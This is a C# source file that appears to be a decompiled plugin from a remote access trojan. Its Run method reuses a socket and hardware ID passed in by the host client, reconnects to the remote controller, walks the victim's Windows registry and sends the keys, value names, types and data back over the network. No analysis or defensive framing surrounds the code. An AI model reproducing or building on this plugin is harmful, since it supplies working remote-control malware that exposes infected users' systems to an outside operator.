using System.Collections.Generic;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using Leb128;
using Plugin.Handler;
using Plugin.Helper;

namespace Plugin;

public class Plugin
{
	public static Socket tcpClient;

	public static X509Certificate2 X509Certificate2;

	public static string hwid;

	public void Run(Socket TcpClient, X509Certificate2 x509Certificate2, string Hwid, byte[] Pack)
	{
		tcpClient = TcpClient;
		hwid = Hwid;
		X509Certificate2 = x509Certificate2;
		Client.Connect(tcpClient.RemoteEndPoint.ToString().Split(new char[1] { ':' })[0], tcpClient.RemoteEndPoint.ToString().Split(new char[1] { ':' })[1]);
		if (Client.itsConnect)
		{
			string text = "";
			RegistrySeeker registrySeeker = new RegistrySeeker();
			registrySeeker.BeginSeeking(text);
			List<object> list = new List<object>();
			list.AddRange(new object[4] { "Regedit", "Connect", Hwid, text });
			for (int i = 0; i < registrySeeker.Matches.Length; i++)
			{
				List<object> list2 = new List<object>();
				for (int j = 0; j < registrySeeker.Matches[i].Data.Length; j++)
				{
					list2.AddRange(new object[3]
					{
						registrySeeker.Matches[i].Data[j].Name,
						(int)registrySeeker.Matches[i].Data[j].Kind,
						registrySeeker.Matches[i].Data[j].Data
					});
				}
				list.AddRange(new object[3]
				{
					registrySeeker.Matches[i].Key,
					LEB128.Write(list2.ToArray()),
					registrySeeker.Matches[i].HasSubKeys
				});
			}
			Client.Send(LEB128.Write(list.ToArray()));
		}
		while (Client.itsConnect)
		{
			Thread.Sleep(1000);
		}
		Client.Disconnect();
		Thread.Sleep(5000);
	}
}
